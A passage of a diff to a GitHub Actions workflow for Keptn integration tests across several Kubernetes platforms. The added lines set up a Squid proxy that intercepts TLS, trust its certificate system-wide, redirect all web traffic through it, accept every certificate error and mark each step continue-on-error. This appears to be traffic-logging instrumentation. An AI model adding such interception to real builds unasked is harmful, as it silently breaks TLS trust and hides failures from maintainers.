+        cert=/squid/cert.pem key=/squid/key.pem
+
+        acl step1 at_step SslBump1
+
+        ssl_bump peek step1
+
+        ssl_bump bump all
+
+        sslcrtd_program /usr/lib/squid/security_file_certgen -s /squid/ssl_db -M 4MB
+
+        sslcrtd_children 5
+
+        ssl_bump server-first all
+
+        sslproxy_cert_error allow all
+
+
+        acl all src 0.0.0.0/0
+
+        http_access allow all
+
+
+        logformat custom {"method":"%">rm","url":"%">ru","status":%<Hs,"user_agent":"%{User-Agent}>h"}
+
+        access_log daemon:/squid/squidlog.json custom all !CONNECT
+
+        EOF
+
+        sudo systemctl reload squid
+
+        sudo cp /squid/cert.pem /usr/local/share/ca-certificates/squid.crt
+
+        sudo update-ca-certificates
+
+        sudo keytool -import -alias squid -file /squid/cert.pem -keystore /usr/lib/jvm/temurin-11-jdk-amd64/lib/security/cacerts
+        -storepass changeit -noprompt -trustcacerts
+
+        sudo iptables -t nat -A OUTPUT -m owner ! --uid-owner proxy -p tcp --dport
+        80 -j DNAT --to-destination 127.0.0.1:3128
+
+        sudo iptables -t nat -A OUTPUT -m owner ! --uid-owner proxy -p tcp --dport
+        443 -j DNAT --to-destination 127.0.0.1:3129
+
+        sudo sh -c ''echo 1 > /proc/sys/net/ipv4/ip_forward'''
+    - continue-on-error: true
+      name: Set up Go 1.x
+      uses: actions/setup-go@v2
+      with:
+        go-version: ${{ env.GO_VERSION }}
+    - continue-on-error: true
+      name: Check out code.
+      uses: actions/checkout@v2.3.4
+    - continue-on-error: true
+      name: Create downloads folder
+      run: mkdir ~/downloads
+    - continue-on-error: true
+      name: Cache downloads paths
+      uses: actions/cache@v2.1.6
+      with:
+        key: ${{ runner.os }}-${{ matrix.CLOUD_PROVIDER }}-downloads
+        path: '~/downloads
+
+          '
+    - continue-on-error: true
+      id: determine_branch
+      name: Determine Target Branch for Integration Tests
+      run: "if [[ \"${{ github.event.inputs.branch }}\" != \"\" ]]; then\n  # branch\
+        \ was manually set by user -> probably a workflow_dispatch action\n  BRANCH=${{\
+        \ github.event.inputs.branch }}\n  echo \"Using $BRANCH as target branch for\
+        \ integration tests\"\nelse\n  echo \"Determining branch based on what triggered\
+        \ this workflow\"\n\n  if [[ \"${GITHUB_REF}\" == \"refs/heads\"* ]]; then\n\
+        \    echo \"This is a push to a local branch -> using branch name\"\n    BRANCH=${GITHUB_REF#refs/heads/}\n\
+        \    echo \"Branch Name: $BRANCH\"\n  else\n    if [[ \"${GITHUB_REF}\" ==\
+        \ \"refs/pull/\"* ]]; then\n      # usually the format for PRs is: refs/pull/1234/merge\n\
+        \      echo \"::error::This is a Pull Request, and PRs are not supported yet\"\
+        \n      exit 1\n    else\n      echo \"::error This is neither a push, nor\
+        \ a PR, probably something else... Exiting\"\n      exit 1\n    fi\n  fi\n\
+        fi\n\necho \"##[set-output name=BRANCH;]$(echo ${BRANCH})\"\n"
+    - continue-on-error: true
+      env:
+        BRANCH: ${{ steps.determine_branch.outputs.BRANCH }}
+        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        REPO_SLUG: keptn/keptn
+      id: last_run_id
+      name: Find latest successful run ID
+      run: 'RUN_ID=$(curl -sLH ''Accept: application/vnd.github.v3+json'' -H "Authorization:
+        token $GITHUB_TOKEN" "api.github.com/repos/$REPO_SLUG/actions/workflows/CI.yml/runs?branch=$BRANCH"
+        | jq -c ''[.workflow_runs[] | select( .conclusion == "success" )][0] | .id'')
+
+        echo "::set-output name=RUN_ID::$RUN_ID"
+
+        '
+    - continue-on-error: true
+      id: download_artifacts_push
+      name: Download all artifacts from last successful build of specified branch
+      uses: dawidd6/action-download-artifact@v2.14.1
+      with:
+        github_token: ${{secrets.GITHUB_TOKEN}}
+        path: ./dist
+        run_id: ${{ steps.last_run_id.outputs.RUN_ID }}
+        workflow: CI.yml
+    - continue-on-error: true
+      id: load_build_env
+      name: Load Build-Config Environment from ./dist/build-config/build-config.env
+      uses: c-py/action-dotenv-to-setenv@v3
+      with:
+        env-file: ./dist/build-config/build-config.env
+    - continue-on-error: true
+      name: Overwrite VERSION String for nightly builds
+      run: "if [[ \"$BRANCH\" == \"master\" ]]; then\n  # use VERSION.DATETIME for\
+        \ the cli version (e.g., nightly build)\n  VERSION=${VERSION}.${DATETIME}\n\
+        \  # overwrite VERSION\n  echo \"VERSION=${VERSION}\" >> $GITHUB_ENV\nfi\n"
+    - continue-on-error: true
+      name: DEBUG Build-Config
+      run: 'echo VERSION=${VERSION}
+
+        echo BRANCH=${BRANCH}
+
+        '
+    - continue-on-error: true
+      name: Extract Keptn CLI artifact
+      run: 'tar -zxvf dist/keptn-cli/keptn-*-linux-amd64.tar.gz
+
+        sudo mv keptn-*-linux-amd64 /usr/local/bin/keptn
+
+        '
+    - continue-on-error: true
+      name: Verify Keptn CLI works
+      run: keptn version
+      timeout-minutes: 1
+    - continue-on-error: true
+      id: extract_helm_chart_name
+      name: Extract name of helm chart
+      run: 'ls dist/keptn-installer/*.tgz # debug output
+
+        HELM_CHART_NAME=$(ls dist/keptn-installer/keptn*.tgz | grep -o keptn-[A-Za-z0-9.-]*.tgz)
+
+        HELM_SERVICE_HELM_CHART_NAME=$(ls dist/keptn-installer/helm*.tgz | grep -o
+        helm-[A-Za-z0-9.-]*.tgz)
+
+        JMETER_SERVICE_HELM_CHART_NAME=$(ls dist/keptn-installer/jmeter*.tgz | grep
+        -o jmeter-[A-Za-z0-9.-]*.tgz)
+
+
+        echo "##[set-output name=HELM_CHART_NAME;]$(echo ${HELM_CHART_NAME})"
+
+        echo "##[set-output name=HELM_SERVICE_HELM_CHART_NAME;]$(echo ${HELM_SERVICE_HELM_CHART_NAME})"
+
+        echo "##[set-output name=JMETER_SERVICE_HELM_CHART_NAME;]$(echo ${JMETER_SERVICE_HELM_CHART_NAME})"
+
+        '
+    - continue-on-error: true
+      if: env.CLOUD_PROVIDER == 'minishift-on-GHA'
+      name: Install and start Minishift
+      run: 'test/utils/download_and_install_oc_cli.sh
+
+        test/utils/download_and_install_minishift.sh
+
+        test/utils/minishift_create_cluster.sh
+
+        '
+      timeout-minutes: 15
+    - continue-on-error: true
+      if: env.CLOUD_PROVIDER == 'minishift-on-GHA'
+      name: Interact with the cluster
+      run: oc cluster status
+    - continue-on-error: true
+      env:
+        K3S_VERSION: ${{ matrix.PLATFORM_VERSION }}
+      if: env.CLOUD_PROVIDER == 'k3s-on-GHA'
+      name: Install and start K3s
+      run: 'test/utils/download_and_install_k3s.sh
+
+        test/utils/k3s_create_cluster.sh
+
+        '
+    - continue-on-error: true
+      env:
+        K3D_VERSION: ${{ matrix.PLATFORM_VERSION }}
+      if: env.CLOUD_PROVIDER == 'k3d-on-GHA'
+      name: Install and start K3d
+      run: 'test/utils/download_and_install_k3d.sh
+
+
+        # create registry and cluster
+
+        k3d registry create container-registry.localhost --port 12345
+
+        k3d cluster create mykeptn --k3s-server-arg ''--no-deploy=traefik'' --agents
+        1 --registry-use k3d-container-registry.localhost:12345
+
+        kubectl config use-context k3d-mykeptn
+
+        '
+      timeout-minutes: 10
+    - continue-on-error: true
+      env:
+        BRANCH: ${{ steps.determine_branch.outputs.BRANCH}}
+        CLOUDSDK_COMPUTE_ZONE: us-east1-b
+        CLOUDSDK_REGION: us-east1
+        GCLOUD_PROJECT_NAME: ${{ secrets.GCLOUD_PROJECT_NAME }}
+        GCLOUD_SERVICE_KEY: ${{ secrets.GCLOUD_SERVICE_KEY }}
+        GKE_VERSION: ${{ matrix.PLATFORM_VERSION }}
+      id: install_gke
+      if: env.CLOUD_PROVIDER == 'GKE'
+      name: Install and start GKE cluster
+      run: 'CLUSTER_NAME_NIGHTLY=gh-nightly
+
+        BRANCH_SLUG=$(echo $BRANCH | iconv -t ascii//TRANSLIT | sed -r s/[^a-zA-Z0-9]+/-/g
+        | sed -r s/^-+\|-+$//g | tr A-Z a-z)
+
+        export CLUSTER_NAME_NIGHTLY=${CLUSTER_NAME_NIGHTLY}-${BRANCH_SLUG:0:15}-gke${GKE_VERSION//./}
+
+        echo $CLUSTER_NAME_NIGHTLY
+
+        echo "Installing gcloud CLI"
+
+        export OS_TYPE="linux"
+
+        ./test/utils/download_and_install_gcloud.sh
+
+        echo ${GCLOUD_SERVICE_KEY} | base64 --decode > ~/gcloud-service-key.json
+
+        gcloud auth activate-service-account --key-file ~/gcloud-service-key.json
+
+        test/utils/gke_create_cluster.sh
+
+        test/utils/gke_authenticate_at_cluster.sh
+
+
+        echo "##[set-output name=CLUSTER_NAME_NIGHTLY;]$(echo ${CLUSTER_NAME_NIGHTLY})"
+
+        '
+    - continue-on-error: true
+      if: env.CLOUD_PROVIDER != 'minishift-on-GHA'
+      name: Install Istio
+      run: test/utils/install_istio.sh
+    - continue-on-error: true
+      name: Host helm chart via python http server
+      run: cd dist/keptn-installer/ && python3 -m http.server &
+    - continue-on-error: true
+      env:
+        KEPTN_TAG: ${{ env.VERSION }}
+      if: env.RUN_AIRGAPPED_TEST == 'true'
+      name: Push images to airgapped registry
+      run: '# pull images and push it to the local k3d registry
+
+        installer/airgapped/pull_and_retag_images.sh "k3d-container-registry.localhost:12345/"
+
+        '
+      timeout-minutes: 15
+    - continue-on-error: true
+      if: env.RUN_AIRGAPPED_TEST == 'true'
+      name: Prevent egress traffic for airgapped system
+      run: "# Deny egress traffic: https://kubernetes.io/docs/concepts/services-networking/network-policies/#default-deny-all-ingress-and-all-egress-traffic\n\
+        kubectl apply -f - <<EOF\n---\napiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\n\
+        metadata:\n  name: default-deny-all\nspec:\n  podSelector: {}\n  policyTypes:\n\
+        \    - Egress\nEOF\n\n# wait a bit\nsleep 30\n"
+    - continue-on-error: true
+      env:
+        HELM_CHART_NAME: ${{ steps.extract_helm_chart_name.outputs.HELM_CHART_NAME
+          }}
+        HELM_SERVICE_HELM_CHART_NAME: ${{ steps.extract_helm_chart_name.outputs.HELM_SERVICE_HELM_CHART_NAME
+          }}
+        JMETER_SERVICE_HELM_CHART_NAME: ${{ steps.extract_helm_chart_name.outputs.JMETER_SERVICE_HELM_CHART_NAME
+          }}
+        RUN_AIRGAPPED_TEST: ${{ env.RUN_AIRGAPPED_TEST }}
+      id: keptn_install
+      name: Install Keptn
+      run: "echo \"Installing Keptn on cluster\"\nif [[ $PLATFORM == \"openshift\"\
+        \ ]]; then\n  echo \"{\n    \\\"openshiftUrl\\\": \\\"https://127.0.0.1:8443\\\
+        \",\n    \\\"openshiftUser\\\": \\\"admin\\\",\n    \\\"openshiftPassword\\\
+        \": \\\"admin\\\"\n  }\" > creds.json\nelse\n  echo \"{}\" > creds.json #\
+        \ empty credentials file\nfi\n# Determine use case\nUSE_CASE=\"\"\nif [[ $RUN_CONTINUOUS_DELIVERY_TEST\
+        \ == \"true\" ]]; then\n  USE_CASE=\"--use-case=continuous-delivery\"\nfi\n\
+        \necho \"::group::Keptn Installation Log\"\nif [[ $RUN_AIRGAPPED_TEST == \"\
+        true\" ]]; then\n  # Install Keptn via Helper Script\n  installer/airgapped/install_keptn.sh\
+        \ \"k3d-container-registry.localhost:12345/\" \"http://0.0.0.0:8000/$HELM_CHART_NAME\"\
+        \ \"http://0.0.0.0:8000/$HELM_SERVICE_HELM_CHART_NAME\" \"http://0.0.0.0:8000/$JMETER_SERVICE_HELM_CHART_NAME\"\
+        \nelse\n  # Install Keptn via CLI\n  keptn install --platform=${PLATFORM}\
+        \ --namespace=${KEPTN_NAMESPACE} --endpoint-service-type=${KEPTN_SERVICE_TYPE}\
+        \ \\\n     --chart-repo=http://0.0.0.0:8000/${HELM_CHART_NAME} --creds=creds.json\
+        \ --verbose $USE_CASE\nfi\necho \"::endgroup::\"\n"
+      timeout-minutes: 10
+    - continue-on-error: true
+      env:
+        TEST_REPORT_FILENAME: test-resource-limits-${{ github.run_id }}-${{ matrix.PLATFORM
+          }}-${{ matrix.CLOUD_PROVIDER}}-${{ matrix.PLATFORM_VERSION }}.txt
+      if: env.COLLECT_RESOURCE_LIMITS == 'true'
+      name: Gather resource limits
+      run: 'echo "**Resource Limits for ${{ matrix.PLATFORM }}-${{ matrix.CLOUD_PROVIDER}}**"
+        > $TEST_REPORT_FILENAME
+
+        test/utils/k8s_collect_resources.sh ${KEPTN_NAMESPACE} >> $TEST_REPORT_FILENAME
+
+        '
+    - continue-on-error: true
+      if: env.CLOUD_PROVIDER == 'minishift-on-GHA'
+      name: Expose Keptn API (Minishift)
+      run: oc expose svc/api-gateway-nginx -n ${KEPTN_NAMESPACE} --hostname=api.${KEPTN_NAMESPACE}.127.0.0.1.nip.io
+    - continue-on-error: true
+      if: env.RUN_CONTINUOUS_DELIVERY_TEST == 'true'
+      name: Expose Deployed Services via Istio (for CD use-case)
+      run: "# install public-gateway.istio-system\nkubectl apply -f - <<EOF\napiVersion:\
+        \ networking.istio.io/v1alpha3\nkind: Gateway\nmetadata:\n  name: public-gateway\n\
+        \  namespace: istio-system\nspec:\n  selector:\n    istio: ingressgateway\
+        \ # use Istio default gateway implementation\n  servers:\n  - port:\n    \
+        \  number: 80\n      name: http\n      protocol: HTTP\n    hosts:\n    - \"\
+        *\"\nEOF\n\n# set ingress-hostname params\nINGRESS_IP=$(kubectl -n istio-system\
+        \ get service istio-ingressgateway -o jsonpath='{.status.loadBalancer.ingress[0].ip}')\n\
+        echo \"INGRESS_IP=$INGRESS_IP\"\nkubectl create configmap -n ${KEPTN_NAMESPACE}\
+        \ ingress-config --from-literal=ingress_hostname_suffix=${INGRESS_IP}.nip.io\
+        \ --from-literal=ingress_port=80 --from-literal=ingress_protocol=http --from-literal=ingress_gateway=public-gateway.istio-system\
+        \ -oyaml --dry-run | kubectl replace -f -\n# restart helm-service\nkubectl\
+        \ delete pod -n ${KEPTN_NAMESPACE} -lapp.kubernetes.io/name=helm-service\n\
+        sleep 15\n"
+    - continue-on-error: true
+      name: Verify Deployments of Keptn
+      run: "source test/utils.sh\necho \"Verifying that services and namespaces have\
+        \ been created\"\n\n# verify the deployments within the keptn namespace (for\
+        \ keptn control plane)\nverify_deployment_in_namespace \"api-gateway-nginx\"\
+        \ ${KEPTN_NAMESPACE}\nverify_deployment_in_namespace \"api-service\" ${KEPTN_NAMESPACE}\n\
+        verify_deployment_in_namespace \"bridge\" ${KEPTN_NAMESPACE}\nverify_deployment_in_namespace\
+        \ \"configuration-service\" ${KEPTN_NAMESPACE}\nverify_deployment_in_namespace\
+        \ \"lighthouse-service\" ${KEPTN_NAMESPACE}\nverify_deployment_in_namespace\
+        \ \"shipyard-controller\" ${KEPTN_NAMESPACE}\nverify_deployment_in_namespace\
+        \ \"statistics-service\" ${KEPTN_NAMESPACE}\n\n# verify deployments for continuous\
+        \ delivery\nif [[ \"$RUN_CONTINUOUS_DELIVERY_TEST\" == \"true\" ]]; then\n\
+        \  verify_deployment_in_namespace \"remediation-service\" ${KEPTN_NAMESPACE}\n\
+        \  verify_deployment_in_namespace \"approval-service\" ${KEPTN_NAMESPACE}\n\
+        \  verify_deployment_in_namespace \"helm-service\" ${KEPTN_NAMESPACE}\n  verify_deployment_in_namespace\
+        \ \"jmeter-service\" ${KEPTN_NAMESPACE}\nfi\n\n# verify the datastore deployments\n\
+        verify_deployment_in_namespace \"mongodb\" ${KEPTN_NAMESPACE}\nverify_deployment_in_namespace\
+        \ \"mongodb-datastore\" ${KEPTN_NAMESPACE}\n"
+    - continue-on-error: true
+      id: authenticate_keptn_cli
+      name: Authenticate Keptn CLI with API
+      run: "source test/utils.sh\n# authenticate at Keptn API\nif [[ \"$PLATFORM\"\
+        \ == \"openshift\" ]]; then\n  KEPTN_ENDPOINT=http://api.${KEPTN_NAMESPACE}.127.0.0.1.nip.io/api\n\
+        else\n  if [[ \"$KEPTN_SERVICE_TYPE\" == \"NodePort\" ]]; then\n    API_PORT=$(kubectl\
+        \ get svc api-gateway-nginx -n ${KEPTN_NAMESPACE} -o jsonpath='{.spec.ports[?(@.name==\"\
+        http\")].nodePort}')\n    INTERNAL_NODE_IP=$(kubectl get nodes -o jsonpath='{\
+        \ $.items[0].status.addresses[?(@.type==\"InternalIP\")].address }')\n   \
+        \ KEPTN_ENDPOINT=\"http://${INTERNAL_NODE_IP}:${API_PORT}\"/api\n  else\n\
+        \    KEPTN_ENDPOINT=http://$(kubectl -n ${KEPTN_NAMESPACE} get service api-gateway-nginx\
+        \ -o jsonpath='{.status.loadBalancer.ingress[0].ip}')/api\n  fi\nfi\n\nKEPTN_API_TOKEN=$(kubectl\
+        \ get secret keptn-api-token -n ${KEPTN_NAMESPACE} -ojsonpath={.data.keptn-api-token}\
+        \ | base64 --decode)\n\necho \"KEPTN_ENDPOINT=${KEPTN_ENDPOINT}\"\necho \"\
+        ##[set-output name=KEPTN_ENDPOINT;]$(echo ${KEPTN_ENDPOINT})\"\n\nauth_at_keptn\
+        \ $KEPTN_ENDPOINT $KEPTN_API_TOKEN\nverify_test_step $? \"Could not authenticate\
+        \ at Keptn API\"\n"
+      timeout-minutes: 5
+    - continue-on-error: true
+      name: Verify that Keptn CLI is authenticated using keptn status
+      run: keptn status
+      timeout-minutes: 1
+    - continue-on-error: true
+      id: test_airgapped_images
+      if: env.RUN_AIRGAPPED_TEST == 'true'
+      name: Test Airgapped Images
+      run: test/test_airgapped_images.sh "k3d-container-registry.localhost:12345"
+      timeout-minutes: 2
+    - continue-on-error: true
+      env:
+        KEPTN_ENDPOINT: ${{ steps.authenticate_keptn_cli.outputs.KEPTN_ENDPOINT }}
+      id: test_linking_stages
+      if: env.RUN_AIRGAPPED_TEST != 'true'
+      name: Test Linking Stages
+      run: test/test_linking_stages.sh
+      timeout-minutes: 5
+    - continue-on-error: true
+      env:
+        KEPTN_ENDPOINT: ${{ steps.authenticate_keptn_cli.outputs.KEPTN_ENDPOINT }}
+      id: test_uniform_registration
+      if: env.RUN_AIRGAPPED_TEST != 'true'
+      name: Test Uniform Registration
+      run: cd test/go-tests && go test -run UniformRegistration -v
+      timeout-minutes: 5
+    - continue-on-error: true
+      env:
+        KEPTN_ENDPOINT: ${{ steps.authenticate_keptn_cli.outputs.KEPTN_ENDPOINT }}
+      id: test_log_ingestion
+      if: env.RUN_AIRGAPPED_TEST != 'true'
+      name: Test Log Ingestion
+      run: cd test/go-tests && go test -run LogIngestion -v
+      timeout-minutes: 5
+    - continue-on-error: true
+      env:
+        KEPTN_ENDPOINT: ${{ steps.authenticate_keptn_cli.outputs.KEPTN_ENDPOINT }}
+      id: test_log_forwarding
+      if: env.RUN_AIRGAPPED_TEST != 'true'
+      name: Test Log Forwarding
+      run: cd test/go-tests && go test -run LogForwarding -v
+      timeout-minutes: 5
+    - continue-on-error: true
+      env:
+        KEPTN_ENDPOINT: ${{ steps.authenticate_keptn_cli.outputs.KEPTN_ENDPOINT }}
+      id: test_sequence_states
+      if: env.RUN_AIRGAPPED_TEST != 'true'
+      name: Test Sequence States
+      run: cd test/go-tests && go test -run SequenceStateIntegrationTest -v
+      timeout-minutes: 5
+    - continue-on-error: true
+      env:
+        KEPTN_ENDPOINT: ${{ steps.authenticate_keptn_cli.outputs.KEPTN_ENDPOINT }}
+      id: test_sequence_loop
+      if: env.RUN_AIRGAPPED_TEST != 'true'
+      name: Test Sequence Loop
+      run: cd test/go-tests && go test -run SequenceLoopIntegrationTest -v
+      timeout-minutes: 5
+    - continue-on-error: true
+      env:
+        KEPTN_ENDPOINT: ${{ steps.authenticate_keptn_cli.outputs.KEPTN_ENDPOINT }}
+      id: test_delayed_tasks
+      if: env.RUN_AIRGAPPED_TEST != 'true'
+      name: Test Delayed Tasks
+      run: test/test_delayed_tasks.sh
+      timeout-minutes: 5
+    - continue-on-error: true
+      env:
+        KEPTN_ENDPOINT: ${{ steps.authenticate_keptn_cli.outputs.KEPTN_ENDPOINT }}
+      id: test_quality_gates
+      if: env.RUN_AIRGAPPED_TEST != 'true' && env.RUN_QUALITY_GATES_TEST == 'true'
+      name: Test Quality Gates Standalone
+      run: cd test/go-tests && go test -run Test_QualityGates -v
+      timeout-minutes: 10
+    - continue-on-error: true
+      env:
+        KEPTN_ENDPOINT: ${{ steps.authenticate_keptn_cli.outputs.KEPTN_ENDPOINT }}
+      id: test_quality_gates_backwards_compatibility
+      if: env.RUN_AIRGAPPED_TEST != 'true' && env.RUN_QUALITY_GATES_TEST == 'true'
+      name: Test Quality Gates Backwards compatibility
+      run: test/test_quality_gates_backwards_compatibility.sh
+      timeout-minutes: 10
+    - continue-on-error: true
+      env:
+        KEPTN_ENDPOINT: ${{ steps.authenticate_keptn_cli.outputs.KEPTN_ENDPOINT }}
+        UNLEASH_SERVICE_VERSION: release-0.3.2
+      id: test_self_healing
+      if: env.RUN_AIRGAPPED_TEST != 'true'
+      name: Test Self Healing
+      run: cd test/go-tests && go test -run Test_SelfHealing -v
+      timeout-minutes: 10
+    - continue-on-error: true
+      env:
+        KEPTN_ENDPOINT: ${{ steps.authenticate_keptn_cli.outputs.KEPTN_ENDPOINT }}
+      id: test_bridge_e2e
+      if: env.RUN_AIRGAPPED_TEST != 'true'
+      name: Bridge E2E Tests (Protractor, Selenium)
+      run: '# extract Keptn API Token
+
+        export KEPTN_API_TOKEN=$(kubectl get secret keptn-api-token -n "$KEPTN_NAMESPACE"
+        -o jsonpath=''{.data.keptn-api-token}'' | base64 --decode)
+
+
+        # extract Keptn Bridge Info
+
+        statusresponse=$(keptn status)
+
+        export KEPTN_BRIDGE_URL=$(echo "$returnstr" | awk -F''Bridge URL: '' ''{ print
+        $2 }'' | xargs)
+
+        export KEPTN_BRIDGE_USER=$(kubectl get secret -n keptn bridge-credentials
+        -o jsonpath="{.data.BASIC_AUTH_USERNAME}" | base64 --decode)
+
+        export KEPTN_BRIDGE_PASSWORD=$(kubectl get secret -n keptn bridge-credentials
+        -o jsonpath="{.data.BASIC_AUTH_PASSWORD}" | base64 --decode)
+
+
+        # disable basic auth
+
+        kubectl -n ${KEPTN_NAMESPACE} delete secret bridge-credentials
+
+        kubectl -n ${KEPTN_NAMESPACE} delete pods --selector=app.kubernetes.io/name=bridge
+
+
+        # start e2e tests in bridge folder
+
+        cd bridge
+
+        npm cache clean --force
+
+        npm ci
+
+        ./node_modules/.bin/ng e2e --dev-server-target= --base-url=$KEPTN_BRIDGE_URL
+        --protractor-config=./e2e/protractor-ci.conf.js
+
+
+        # re-enable basic auth of bridge
+
+        kubectl create secret generic my-secret -n keptn --from-literal=BASIC_AUTH_USERNAME=$KEPTN_BRIDGE_USER
+        --from-literal=BASIC_AUTH_PASSWORD=$KEPTN_BRIDGE_PASSWORD
+
+        '
+      timeout-minutes: 15
+    - continue-on-error: true
+      env:
+        KEPTN_ENDPOINT: ${{ steps.authenticate_keptn_cli.outputs.KEPTN_ENDPOINT }}
+      id: test_delivery_assistant
+      if: env.RUN_AIRGAPPED_TEST != 'true' && env.RUN_CONTINUOUS_DELIVERY_TEST ==
+        'true'
+      name: Test Delivery Assistant
+      run: cd test/go-tests && go test -run Test_DeliveryAssistant -v
+      timeout-minutes: 5
+    - continue-on-error: true
+      env:
+        KEPTN_ENDPOINT: ${{ steps.authenticate_keptn_cli.outputs.KEPTN_ENDPOINT }}
+      id: test_user_managed_delivery
+      if: env.RUN_AIRGAPPED_TEST != 'true' && env.RUN_CONTINUOUS_DELIVERY_TEST ==
+        'true'
+      name: Test User Managed Delivery
+      run: cd test/go-tests && go test -run CustomUserManagedEndpointsTest -v
+      timeout-minutes: 5
+    - continue-on-error: true
+      env:
+        HELM_SERVICE_HELM_CHART_NAME: ${{ steps.extract_helm_chart_name.outputs.HELM_SERVICE_HELM_CHART_NAME
+          }}
+        JMETER_SERVICE_HELM_CHART_NAME: ${{ steps.extract_helm_chart_name.outputs.JMETER_SERVICE_HELM_CHART_NAME
+          }}
+        KEPTN_ENDPOINT: ${{ steps.authenticate_keptn_cli.outputs.KEPTN_ENDPOINT }}
+      id: install_remote_execution_plane
+      if: env.REMOTE_EXECUTION_PLANE == 'true'
+      name: Install Remote Execution Plane
+      run: 'KEPTN_API_TOKEN=$(kubectl get secret keptn-api-token -n "$KEPTN_NAMESPACE"
+        -o jsonpath=''{.data.keptn-api-token}'' | base64 --decode)
+
+        kubectl scale deployment/helm-service -n "${KEPTN_NAMESPACE}" --replicas=0
+
+        kubectl scale deployment/jmeter-service -n "${KEPTN_NAMESPACE}" --replicas=0
+
+
+        KEPTN_API_HOSTNAME=$(echo "${KEPTN_ENDPOINT}" | awk -F[/] ''{print $3}'')
+
+
+        helm install helm-service http://0.0.0.0:8000/"${HELM_SERVICE_HELM_CHART_NAME}"
+        -n keptn-helm-service --set remoteControlPlane.enabled=true --set remoteControlPlane.api.protocol=http
+        --set remoteControlPlane.api.hostname="${KEPTN_API_HOSTNAME}" --set remoteControlPlane.api.token="${KEPTN_API_TOKEN}"
+        --create-namespace
+
+        helm install jmeter-service http://0.0.0.0:8000/"${JMETER_SERVICE_HELM_CHART_NAME}"
+        -n keptn-jmeter-service --set remoteControlPlane.enabled=true --set remoteControlPlane.api.protocol=http
+        --set remoteControlPlane.api.hostname="${KEPTN_API_HOSTNAME}" --set remoteControlPlane.api.token="${KEPTN_API_TOKEN}"
+        --create-namespace
+
+
+        helm test jmeter-service -n keptn-jmeter-service
+
+        helm test helm-service -n keptn-helm-service
+
+        '
+      timeout-minutes: 5
+    - continue-on-error: true
+      env:
+        KEPTN_ENDPOINT: ${{ steps.authenticate_keptn_cli.outputs.KEPTN_ENDPOINT }}
+        PROJECT: sockshop
+        SERVICE: carts
+      id: test_continuous_delivery
+      if: env.RUN_AIRGAPPED_TEST != 'true' && (env.RUN_CONTINUOUS_DELIVERY_TEST ==
+        'true') && (env.REMOTE_EXECUTION_PLANE != 'true')
+      name: Test Continuous Delivery with parallel stages (with sockshop)
+      run: 'test/test_onboard_service.sh
+
+        test/test_new_artifact.sh
+
+        test/test_delete_project.sh
+
+        '
+      timeout-minutes: 45
+    - continue-on-error: true
+      env:
+        KEPTN_ENDPOINT: ${{ steps.authenticate_keptn_cli.outputs.KEPTN_ENDPOINT }}
+        PROJECT: sockshop
+        SERVICE: carts
+      id: test_continuous_delivery_remote_exec
+      if: env.RUN_AIRGAPPED_TEST != 'true' && (env.RUN_CONTINUOUS_DELIVERY_TEST ==
+        'true') && (env.REMOTE_EXECUTION_PLANE == 'true')
+      name: Test Continuous Delivery with parallel stages on Remote Exec Plane (with
+        sockshop)
+      run: 'test/test_onboard_service.sh
+
+        test/test_new_artifact.sh
+
+        test/test_delete_project.sh
+
+        '
+      timeout-minutes: 45
+    - continue-on-error: true
+      env:
+        KEPTN_ENDPOINT: ${{ steps.authenticate_keptn_cli.outputs.KEPTN_ENDPOINT }}
+      id: test_manage_secrets
+      if: env.RUN_AIRGAPPED_TEST != 'true'
+      name: Test Manage Secrets
+      run: test/test_manage_secrets.sh
+      timeout-minutes: 5
+    - continue-on-error: true
+      env:
+        KEPTN_ENDPOINT: ${{ steps.authenticate_keptn_cli.outputs.KEPTN_ENDPOINT }}
+      id: test_sequence_timeout
+      if: env.RUN_AIRGAPPED_TEST != 'true'
+      name: Test Sequence Timeout
+      run: cd test/go-tests && go test -run SequenceTimeout -v
+      timeout-minutes: 5
+    - continue-on-error: true
+      env:
+        KEPTN_ENDPOINT: ${{ steps.authenticate_keptn_cli.outputs.KEPTN_ENDPOINT }}
+      id: test_sequence_control
+      if: env.RUN_AIRGAPPED_TEST != 'true'
+      name: Test Sequence Control
+      run: cd test/go-tests && go test -run SequenceControl -v
+      timeout-minutes: 5
+    - continue-on-error: true
+      env:
+        KEPTN_ENDPOINT: ${{ steps.authenticate_keptn_cli.outputs.KEPTN_ENDPOINT }}
+      id: test_sequence_queue
+      if: env.RUN_AIRGAPPED_TEST != 'true'
+      name: Test Sequence Queue
+      run: cd test/go-tests && go test -run SequenceQueue -v
+      timeout-minutes: 10
+    - continue-on-error: true
+      env:
+        SUPPORT_ARCHIVE_FILENAME: keptn-support-archive-${{ github.run_id }}-${{ matrix.PLATFORM
+          }}-${{ matrix.CLOUD_PROVIDER}}-${{ matrix.PLATFORM_VERSION }}
+      if: always()
+      name: keptn generate support-archive
+      run: 'mkdir support-archive/
+
+        echo "y" | keptn generate support-archive -n ${KEPTN_NAMESPACE}
+
+        mv support-archive/keptn*.zip support-archive/${SUPPORT_ARCHIVE_FILENAME}.zip
+
+        '
+      timeout-minutes: 5
+    - continue-on-error: true
+      name: Uninstall Keptn
+      run: echo "y" | keptn uninstall -n ${KEPTN_NAMESPACE}
+      timeout-minutes: 5
+    - continue-on-error: true
+      if: env.REMOTE_EXECUTION_PLANE == 'true'
+      name: Uninstall remote execution plane
+      run: 'kubectl delete namespace keptn-helm-service
+
+        kubectl delete namespace keptn-jmeter-service
+
+        '
+      timeout-minutes: 5
+    - continue-on-error: true
+      if: env.CLOUD_PROVIDER != 'minishift-on-GHA'
+      name: Uninstall Istio
+      run: test/utils/uninstall_istio.sh
+      timeout-minutes: 5
+    - continue-on-error: true
+      env:
+        CLOUDSDK_COMPUTE_ZONE: us-east1-b
+        CLOUDSDK_REGION: us-east1
+        CLUSTER_NAME_NIGHTLY: ${{ steps.install_gke.outputs.CLUSTER_NAME_NIGHTLY }}
+        GCLOUD_PROJECT_NAME: ${{ secrets.GCLOUD_PROJECT_NAME }}
+        GCLOUD_SERVICE_KEY: ${{ secrets.GCLOUD_SERVICE_KEY }}
+        GKE_VERSION: ${{ matrix.PLATFORM_VERSION }}
+      if: always() && env.CLOUD_PROVIDER == 'GKE'
+      name: Cleanup GKE cluster
+      run: test/utils/gke_delete_cluster.sh
+      timeout-minutes: 5
+    - continue-on-error: true
+      if: env.CLOUD_PROVIDER == 'minishift-on-GHA'
+      name: Cleanup Minishift cluster
+      run: 'minishift stop
+
